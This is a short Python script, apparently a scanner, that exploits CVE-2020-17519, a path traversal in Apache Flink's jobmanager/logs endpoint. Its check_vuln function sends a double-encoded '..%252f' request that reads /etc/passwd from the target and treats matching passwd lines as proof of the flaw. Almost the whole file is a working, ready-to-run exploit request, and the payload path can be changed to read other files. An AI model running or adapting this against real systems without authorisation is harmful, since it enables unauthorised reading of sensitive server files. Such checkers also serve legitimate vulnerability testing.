# -*- coding:utf-8 -*-
#Apache Flink jobmanager/logs Path Traversal (CVE-2020-17519)

import requests

headers = {
    "Content-Type":"application/x-www-form-urlencoded",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36 Edge/86.0.622.56"
}
def http_proto_judge(ip,port):  #判断http及https协议头
    try:
        http_prots = ['http://','https://']
        for http_proto in http_prots:
            url = '{http_prot}{ip}:{port}/'.format(http_prot=http_proto, ip=ip, port=port)
            get_url = requests.get(url, timeout=5, allow_redirects=False, verify=False, headers=headers)
            if get_url.status_code == 200 or get_url.status_code == 301 or get_url.status_code == 302:
                return http_proto
            else:
                continue
    except Exception as msg:
        #print(msg)
        return False
        
def check_vuln(ip,port):
	http_proto = http_proto_judge(ip,port)#获取协议头
	url = "{proto}{ip}:{port}/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd".format(proto=http_proto,ip=ip,port=port)
	try:
		res = requests.get(url=url,headers=headers,timeout=5)
		if "root:x:0:0:" and "daemon:x:1:1:daemon" in res.text:#判断是否存在passwd文件内容
			#print("Vuln exists")
			return True
		else:
			#print("No vuln")
			return False
	except Exception as msg:
		#print(msg)
		return False
		
#if __name__ == '__main__':
#  check_vuln('192.168.56.123',8080)
